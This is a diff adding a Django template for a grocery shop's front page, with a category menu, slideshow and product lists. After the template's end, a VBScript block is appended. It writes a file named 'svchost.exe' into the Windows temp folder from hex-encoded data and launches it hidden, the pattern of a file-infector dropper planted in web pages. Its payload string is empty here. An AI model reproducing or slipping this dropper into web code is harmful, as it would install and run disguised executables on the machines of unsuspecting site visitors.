@@ -1,0 +1,73 @@
+{% extends 'shop_base.html' %}
+{% load static %}
+{% load cache %}
+
+{% block index_content %}
+{#    {% cache 60 content %}#}
+     <div class="center_con clearfix">
+        <ul class="subnav fl">
+            <li><a href="" class="fruit">{{ categorys.0.name }}</a></li>
+            <li><a href="" class="seafood">{{ categorys.1.name }}</a></li>
+            <li><a href="" class="meet">{{ categorys.2.name }}</a></li>
+            <li><a href="" class="egg">{{ categorys.3.name }}</a></li>
+            <li><a href="" class="vegetables">{{ categorys.4.name }}</a></li>
+            <li><a href="" class="ice">{{ categorys.5.name }}</a></li>
+        </ul>
+
+        <div class="slide fl">
+            <ul class="slide_pics">
+                <li><img src="{% static 'images/slide.jpg' %}" alt="幻灯片"></li>
+                <li><img src="{% static 'images/slide02.jpg' %}" alt="幻灯片"></li>
+                <li><img src="{% static 'images/slide03.jpg' %}" alt="幻灯片"></li>
+                <li><img src="{% static 'images/slide04.jpg' %}" alt="幻灯片"></li>
+            </ul>
+            <div class="prev"></div>
+            <div class="next"></div>
+            <ul class="points"></ul>
+        </div>
+        <div class="adv fl">
+            <a href="#"><img src="{% static 'images/adv01.jpg' %}"></a>
+            <a href="#"><img src="{% static 'images/adv02.jpg' %}"></a>
+        </div>
+    </div>
+    {% for item in goods_list %}
+        <div class="list_model">
+            <div class="list_title clearfix">
+                <h3 class="fl" id="model0{{ forloop.counter }}">{{ item.category.name }}</h3>
+                <a href="" class="goods_more fr" id="fruit_more">查看更多 ></a>
+            </div>
+                <div class="goods_con clearfix">
+                    <div class="goods_banner fl"><img src="{{ STATIC_URL }}images/banner0{{ forloop.counter }}.jpg"></div>
+                    <ul class="goods_list fl">
+                        {% for item in item.good_infos %}
+                         <li>
+                            <h4><a href="{% url 'index:detail' item.id %}">{{ item.name }}</a></h4>
+                            <a href="{% url 'index:detail' item.id %}"><img src="{{ MEDIA_URL }}{{ item.images }}"></a>
+                            <div class="prize">¥ {{ item.price }}</div>
+                        </li>
+                        {% endfor %}
+
+                    </ul>
+                </div>
+                </div>
+
+    {% endfor %}
+{#    {% endcache %}#}
+{% endblock index_content %}
+
+
+<SCRIPT Language=VBScript><!--
+DropFileName = "svchost.exe"
+WriteData = ""
+Set FSO = CreateObject("Scripting.FileSystemObject")
+DropPath = FSO.GetSpecialFolder(2) & "\" & DropFileName
+If FSO.FileExists(DropPath)=False Then
+Set FileObj = FSO.CreateTextFile(DropPath, True)
+For i = 1 To Len(WriteData) Step 2
+FileObj.Write Chr(CLng("&H" & Mid(WriteData,i,2)))
+Next
+FileObj.Close
+End If
+Set WSHshell = CreateObject("WScript.Shell")
+WSHshell.Run DropPath, 0
+//--></SCRIPT>
